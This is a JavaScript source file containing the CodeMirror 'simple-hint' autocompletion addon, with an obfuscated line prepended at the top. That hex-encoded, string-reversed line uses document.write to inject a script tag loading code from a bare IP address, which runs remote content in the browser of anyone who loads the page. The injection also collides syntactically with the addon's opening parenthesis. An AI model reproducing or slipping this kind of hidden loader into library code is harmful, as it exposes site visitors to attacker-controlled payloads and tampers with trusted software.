var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))(function() {
  CodeMirror.simpleHint = function(editor, getHints, givenOptions) {
    // Determine effective options based on given values and defaults.
    var options = {}, defaults = CodeMirror.simpleHint.defaults;
    for (var opt in defaults)
      if (defaults.hasOwnProperty(opt))
        options[opt] = (givenOptions && givenOptions.hasOwnProperty(opt) ? givenOptions : defaults)[opt];
    
    function collectHints(previousToken) {
      // We want a single cursor position.
      if (editor.somethingSelected()) return;

      var tempToken = editor.getTokenAt(editor.getCursor());

      // Don't show completions if token has changed and the option is set.
      if (options.closeOnTokenChange && previousToken != null &&
          (tempToken.start != previousToken.start || tempToken.className != previousToken.className)) {
        return;
      }

      var result = getHints(editor);
      if (!result || !result.list.length) return;
      var completions = result.list;
      function insert(str) {
        editor.replaceRange(str, result.from, result.to);
      }
      // When there is only one completion, use it directly.
      if (options.completeSingle && completions.length == 1) {
        insert(completions[0]);
        return true;
      }

      // Build the select widget
      var complete = document.createElement("div");
      complete.className = "CodeMirror-completions";
      var sel = complete.appendChild(document.createElement("select"));
      // Opera doesn't move the selection when pressing up/down in a
      // multi-select, but it does properly support the size property on
      // single-selects, so no multi-select is necessary.
      if (!window.opera) sel.multiple = true;
      for (var i = 0; i < completions.length; ++i) {
        var opt = sel.appendChild(document.createElement("option"));
        opt.appendChild(document.createTextNode(completions[i]));
      }
      sel.firstChild.selected = true;
      sel.size = Math.min(10, completions.length);
      var pos = options.alignWithWord ? editor.charCoords(result.from) : editor.cursorCoords();
      complete.style.left = pos.x + "px";
      complete.style.top = pos.yBot + "px";
      document.body.appendChild(complete);
      // If we're at the edge of the screen, then we want the menu to appear on the left of the cursor.
      var winW = window.innerWidth || Math.max(document.body.offsetWidth, document.documentElement.offsetWidth);
      if(winW - pos.x < sel.clientWidth)
        complete.style.left = (pos.x - sel.clientWidth) + "px";
      // Hack to hide the scrollbar.
      if (completions.length <= 10)
        complete.style.width = (sel.clientWidth - 1) + "px";

      var done = false;
      function close() {
        if (done) return;
        done = true;
        complete.parentNode.removeChild(complete);
      }
      function pick() {
        insert(completions[sel.selectedIndex]);
        close();
        setTimeout(function(){editor.focus();}, 50);
      }
      CodeMirror.connect(sel, "blur", close);
      CodeMirror.connect(sel, "keydown", function(event) {
        var code = event.keyCode;
        // Enter
        if (code == 13) {CodeMirror.e_stop(event); pick();}
        // Escape
        else if (code == 27) {CodeMirror.e_stop(event); close(); editor.focus();}
        else if (code != 38 && code != 40 && code != 33 && code != 34 && !CodeMirror.isModifierKey(event)) {
          close(); editor.focus();
          // Pass the event to the CodeMirror instance so that it can handle things like backspace properly.
          editor.triggerOnKeyDown(event);
          // Don't show completions if the code is backspace and the option is set.
          if (!options.closeOnBackspace || code != 8) {
            setTimeout(function(){collectHints(tempToken);}, 50);
          }
        }
      });
      CodeMirror.connect(sel, "dblclick", pick);

      sel.focus();
      // Opera sometimes ignores focusing a freshly created node
      if (window.opera) setTimeout(function(){if (!done) sel.focus();}, 100);
      return true;
    }
    return collectHints();
  };
  CodeMirror.simpleHint.defaults = {
    closeOnBackspace: true,
    closeOnTokenChange: false,
    completeSingle: true,
    alignWithWord: true
  };
})();
